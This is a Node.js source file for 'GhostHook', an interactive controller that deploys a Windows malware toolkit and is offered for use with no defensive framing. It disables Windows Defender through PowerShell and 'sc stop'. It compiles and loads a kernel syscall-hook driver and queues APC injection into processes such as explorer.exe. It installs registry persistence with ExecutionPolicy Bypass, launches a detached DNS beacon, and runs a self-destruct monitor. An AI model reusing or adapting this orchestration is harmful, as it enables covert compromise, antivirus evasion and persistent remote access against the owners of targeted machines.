const fs = require('fs-extra');
const { spawn, exec } = require('child_process');
const path = require('path');
const chalk = require('chalk');
const inquirer = require('inquirer');

class GhostHookNode {
    constructor() {
        this.baseDir = __dirname;
        this.logFile = path.join(this.baseDir, 'ghosthook.log');
        this.config = {
            targetProcesses: ['notepad.exe', 'calc.exe', 'explorer.exe'],
            persistenceMethods: ['registry', 'dns', 'tpm'],
            monitoringEnabled: true,
            autoRestart: true
        };
        this.status = {
            deploymentTime: null,
            activeComponents: [],
            lastHeartbeat: null
        };
    }

    log(message, level = 'INFO') {
        const timestamp = new Date().toLocaleTimeString();
        const colors = {
            INFO: chalk.blue,
            OK: chalk.green,
            WARNING: chalk.yellow,
            ERROR: chalk.red,
            SUCCESS: chalk.green.bold
        };
        
        const colorFunc = colors[level] || chalk.white;
        console.log(`${chalk.gray(`[${timestamp}]`)} ${colorFunc(`[${level}]`)} ${message}`);
        
        fs.appendFileSync(this.logFile, `[${timestamp}] [${level}] ${message}\n`);
    }

    async checkPrivileges() {
        return new Promise((resolve) => {
            exec('net session', (error) => {
                resolve(!error);
            });
        });
    }

    async runCommand(command, args = [], options = {}) {
        return new Promise((resolve, reject) => {
            const child = spawn(command, args, {
                stdio: 'pipe',
                ...options
            });

            let stdout = '';
            let stderr = '';

            child.stdout?.on('data', (data) => {
                stdout += data.toString();
            });

            child.stderr?.on('data', (data) => {
                stderr += data.toString();
            });

            child.on('close', (code) => {
                resolve({
                    code,
                    stdout: stdout.trim(),
                    stderr: stderr.trim()
                });
            });

            child.on('error', reject);
        });
    }

    async disableDefender() {
        this.log('Disabling Windows Defender...');
        
        const commands = [
            ['powershell', ['-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true']],
            ['powershell', ['-Command', 'Set-MpPreference -DisableBehaviorMonitoring $true']],
            ['sc', ['stop', 'WinDefend']]
        ];

        for (const [cmd, args] of commands) {
            try {
                await this.runCommand(cmd, args);
            } catch (error) {
                // Continue on error
            }
        }

        this.log('Windows Defender disabled', 'OK');
    }

    async compileComponents() {
        this.log('Compiling components...');
        let successCount = 0;

        const components = [
            {
                dir: 'driver (kernel-mode operations)',
                file: 'syscall_hook.c',
                cmd: 'cl.exe',
                args: ['syscall_hook.c', '/kernel']
            },
            {
                dir: 'injector',
                file: 'apc_queuer.cpp',
                cmd: 'cl.exe',
                args: ['apc_queuer.cpp', '/link', 'kernel32.lib']
            },
            {
                dir: 'persistence',
                file: 'dns_beacon.cpp',
                cmd: 'cl.exe',
                args: ['dns_beacon.cpp', '/link', 'ws2_32.lib', 'dnsapi.lib']
            },
            {
                dir: 'self_destruct',
                file: 'entropy_monitor.rs',
                cmd: 'rustc',
                args: ['entropy_monitor.rs', '-o', 'entropy_monitor.exe']
            }
        ];

        for (const comp of components) {
            const compDir = path.join(this.baseDir, comp.dir);
            const sourceFile = path.join(compDir, comp.file);

            if (fs.existsSync(sourceFile)) {
                try {
                    const result = await this.runCommand(comp.cmd, comp.args, { cwd: compDir });
                    if (result.code === 0) {
                        this.log(`Compiled ${comp.file}`, 'OK');
                        successCount++;
                    } else {
                        this.log(`Compilation failed: ${comp.file}`, 'ERROR');
                    }
                } catch (error) {
                    this.log(`Compiler error: ${comp.file} - ${error.message}`, 'ERROR');
                }
            }
        }

        return successCount > 0;
    }

    async selectTarget() {
        this.log('Selecting optimal target process...');

        try {
            const result = await this.runCommand('python', ['process_selector.py'], {
                cwd: path.join(this.baseDir, 'injector')
            });

            if (result.code === 0 && result.stdout) {
                const pid = parseInt(result.stdout.trim());
                this.log(`Target selected: PID ${pid}`, 'OK');
                return pid;
            }
        } catch (error) {
            this.log(`Auto-selection failed: ${error.message}`, 'WARNING');
        }

        // Fallback to explorer.exe
        try {
            const result = await this.runCommand('tasklist', ['/fi', 'imagename eq explorer.exe']);
            if (result.stdout.includes('explorer.exe')) {
                this.log('Fallback target: explorer.exe', 'OK');
                return 1000; // Placeholder PID
            }
        } catch (error) {
            this.log('No suitable target found', 'ERROR');
            return null;
        }
    }

    async loadKernelDriver() {
        this.log('Loading kernel driver...');
        const driverPath = path.join(this.baseDir, 'driver (kernel-mode operations)', 'syscall_hook.sys');

        if (!fs.existsSync(driverPath)) {
            this.log('Kernel driver not found', 'WARNING');
            return false;
        }

        try {
            await this.runCommand('sc', ['delete', 'GhostDriver']);
            await this.runCommand('sc', ['create', 'GhostDriver', `binPath=${driverPath}`, 'type=kernel']);
            const result = await this.runCommand('sc', ['start', 'GhostDriver']);

            if (result.code === 0) {
                this.log('Kernel driver loaded successfully', 'OK');
                this.status.activeComponents.push('kernel_driver');
                return true;
            }
        } catch (error) {
            this.log(`Driver load failed: ${error.message}`, 'WARNING');
        }

        return false;
    }

    async executeInjection(targetPid) {
        this.log('Executing process injection...');
        const injectorPath = path.join(this.baseDir, 'injector', 'apc_queuer.exe');

        if (!fs.existsSync(injectorPath)) {
            this.log('APC injector not found', 'WARNING');
            return false;
        }

        try {
            const result = await this.runCommand(injectorPath, [targetPid.toString()]);
            if (result.code === 0) {
                this.log('Process injection successful', 'OK');
                this.status.activeComponents.push('injection');
                return true;
            }
        } catch (error) {
            this.log(`Injection failed: ${error.message}`, 'ERROR');
        }

        return false;
    }

    async establishPersistence() {
        this.log('Establishing persistence mechanisms...');

        // Registry persistence
        const regScript = path.join(this.baseDir, 'persistence', 'registry_shadow.ps1');
        if (fs.existsSync(regScript)) {
            try {
                await this.runCommand('powershell', ['-ExecutionPolicy', 'Bypass', '-File', regScript]);
                this.log('Registry persistence installed', 'OK');
                this.status.activeComponents.push('registry_persistence');
            } catch (error) {
                this.log(`Registry persistence failed: ${error.message}`, 'ERROR');
            }
        }

        // DNS beacon
        const dnsBeacon = path.join(this.baseDir, 'persistence', 'dns_beacon.exe');
        if (fs.existsSync(dnsBeacon)) {
            try {
                spawn(dnsBeacon, [], { detached: true, stdio: 'ignore' });
                this.log('DNS beacon started', 'OK');
                this.status.activeComponents.push('dns_beacon');
            } catch (error) {
                this.log(`DNS beacon startup failed: ${error.message}`, 'ERROR');
            }
        }
    }

    async startMonitoring() {
        if (!this.config.monitoringEnabled) return;

        this.log('Starting monitoring systems...');
        const entropyMonitor = path.join(this.baseDir, 'self_destruct', 'entropy_monitor.exe');

        if (fs.existsSync(entropyMonitor)) {
            try {
                spawn(entropyMonitor, [], { detached: true, stdio: 'ignore' });
                this.log('Entropy monitoring active', 'OK');
                this.status.activeComponents.push('entropy_monitor');
            } catch (error) {
                this.log(`Entropy monitor startup failed: ${error.message}`, 'ERROR');
            }
        }
    }

    async verifyDeployment() {
        this.log('Verifying deployment status...');
        const activeCount = this.status.activeComponents.length;

        this.log(`Active components: ${activeCount}`);
        this.status.activeComponents.forEach(comp => {
            this.log(`  ✓ ${comp}`, 'OK');
        });

        if (activeCount >= 2) {
            this.log('Deployment verification passed', 'SUCCESS');
            return true;
        } else {
            this.log('Insufficient components active', 'WARNING');
            return false;
        }
    }

    async interactiveMenu() {
        const choices = [
            'Full Automated Deployment',
            'Compile Components Only',
            'Test Target Selection',
            'Manual Step-by-Step',
            'Monitor Existing Deployment',
            'Exit'
        ];

        const { action } = await inquirer.prompt([{
            type: 'list',
            name: 'action',
            message: 'Select deployment option:',
            choices
        }]);

        switch (action) {
            case 'Full Automated Deployment':
                return await this.deploy();
            case 'Compile Components Only':
                return await this.compileComponents();
            case 'Test Target Selection':
                const pid = await this.selectTarget();
                return !!pid;
            case 'Manual Step-by-Step':
                return await this.manualDeploy();
            case 'Monitor Existing Deployment':
                return await this.monitorDeployment();
            default:
                return false;
        }
    }

    async manualDeploy() {
        console.log(chalk.yellow('\nManual Step-by-Step Deployment'));
        
        const steps = [
            () => this.compileComponents(),
            () => this.selectTarget(),
            () => this.loadKernelDriver(),
            (pid) => this.executeInjection(pid),
            () => this.establishPersistence(),
            () => this.startMonitoring()
        ];

        let pid;
        for (const [index, step] of steps.entries()) {
            const { proceed } = await inquirer.prompt([{
                type: 'confirm',
                name: 'proceed',
                message: `Execute step ${index + 1}?`,
                default: true
            }]);

            if (proceed) {
                const result = await step(pid);
                if (index === 1) pid = result; // Store PID from target selection
            }
        }

        return await this.verifyDeployment();
    }

    async monitorDeployment() {
        this.log('Starting deployment monitoring...', 'INFO');
        
        setInterval(() => {
            this.status.lastHeartbeat = new Date().toISOString();
            this.log(`Heartbeat - Active: ${this.status.activeComponents.length} components`);
        }, 60000);

        process.on('SIGINT', () => {
            this.log('Monitoring stopped by user', 'WARNING');
            process.exit(0);
        });
    }

    async deploy() {
        this.log('Starting GhostHook Node.js automation');
        this.status.deploymentTime = new Date().toISOString();

        if (!(await this.checkPrivileges())) {
            this.log('Administrator privileges required!', 'ERROR');
            return false;
        }

        try {
            await this.disableDefender();

            if (!(await this.compileComponents())) {
                this.log('Component compilation failed', 'ERROR');
                return false;
            }

            const targetPid = await this.selectTarget();
            if (!targetPid) return false;

            await this.loadKernelDriver();
            await this.executeInjection(targetPid);
            await this.establishPersistence();
            await this.startMonitoring();

            const success = await this.verifyDeployment();

            if (success) {
                this.log('GhostHook deployment completed successfully!', 'SUCCESS');
                if (this.config.autoRestart) {
                    await this.monitorDeployment();
                }
            }

            return success;

        } catch (error) {
            this.log(`Deployment failed: ${error.message}`, 'ERROR');
            return false;
        }
    }
}

async function main() {
    console.log(chalk.cyan('╔══════════════════════════════════════════╗'));
    console.log(chalk.cyan('║        GhostHook Node.js Automation     ║'));
    console.log(chalk.cyan('║           Interactive Controller        ║'));
    console.log(chalk.cyan('╚══════════════════════════════════════════╝'));
    console.log();

    const automation = new GhostHookNode();
    
    const { mode } = await inquirer.prompt([{
        type: 'list',
        name: 'mode',
        message: 'Select operation mode:',
        choices: [
            'Interactive Menu',
            'Automated Deployment',
            'Exit'
        ]
    }]);

    let success = false;
    
    switch (mode) {
        case 'Interactive Menu':
            success = await automation.interactiveMenu();
            break;
        case 'Automated Deployment':
            success = await automation.deploy();
            break;
        default:
            console.log('Goodbye!');
            process.exit(0);
    }

    if (success) {
        console.log(chalk.green('\n✓ Operation completed successfully'));
    } else {
        console.log(chalk.red('\n✗ Operation failed'));
        process.exit(1);
    }
}

if (require.main === module) {
    main().catch(console.error);
}

module.exports = GhostHookNode;